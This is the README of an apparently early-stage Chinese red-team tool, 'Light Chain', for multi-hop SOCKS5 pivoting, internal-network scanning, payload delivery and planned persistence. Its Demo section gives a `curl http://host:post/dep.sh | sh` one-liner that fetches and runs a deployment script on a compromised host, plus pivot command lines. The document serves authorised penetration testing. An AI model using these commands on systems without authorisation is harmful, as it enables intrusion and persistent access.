# Light Chain

![version](https://img.shields.io/github/v/release/MayMistery/LightChain?include_prereleases&label=version)
![license](https://img.shields.io/github/license/MayMistery/LightChain?color=FF5531)

红队工具，内网前哨站。轻量化，支持多级正、反向代理；载荷投递、落地；可以进行主、被动内网探测。

## Features

- socks5多级代理
- 主、被动内网探测
- 长链路载荷投递一键落地

## Todo
### Step 1
- [ ] 增加ssh端口转发
- [ ] 增加一键部署脚本
- [ ] 优化多级代理时的参数配置
- [ ] 增加socks5代理
- [ ] 增加-d后台运行
- [ ] 增加日志输出（可配置
- ### Step 2
- [ ] 考虑增加载荷投递
- [ ] Shell管理，或联动CS（远程命令执行
- [ ] 增加权限维持手段
- [ ] 考虑增加载荷投递

## Demo(预期)

- 攻击机（公网）`lChain -srv eth0 8888`
- 攻击机（无公网ip）`lChain -srv eth0 -local 8888`（文件服务器
读取配置文件cfg.ini中的公网机ssh配置，利用ssh进行远端端口转发搭建公网服务
- 宿主端一键落地 `curl http://host:post/dep.sh | sh`（服务端运行时生成dep.sh）
- 宿主端 `lChain -slv eth0 -C '121.*.*.1:8888,121.*.*.2:8888' 8888`(部署在eth0网卡上，-C从宿主机到攻击机路径)

## Tree
```shell
├── LICENSE
├── README.md
├── cmd
│   ├── cmd.go    
│   ├── config.go    # 变量配置
│   └── flag.go      # arg配置、解析
├── clients
│   ├── clients.go    
│   ├── scan.go      # 扫描模块
│   └── chain.go     # 链路处理
├── server
│   ├── server.go    
│   ├── vps.go       # 远程端口转发获得公网ip
│   └── file.go      # 文件服务器
├── utils
│   ├── utils.go    
│   ├── dep.go       # 生成部署sh脚本
│   ├── socks5.go    # sock5代理
│   └── ssh.go       # 端口转发
├── go.mod
├── go.sum
├── main.go
├── makefile
├── release
├── file             # 文件服务文件夹
└── log              # 日志


```

## Contributor

<a href="https://github.com/MayMistery/LightChain/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=MayMistery/LightChain" />
</a>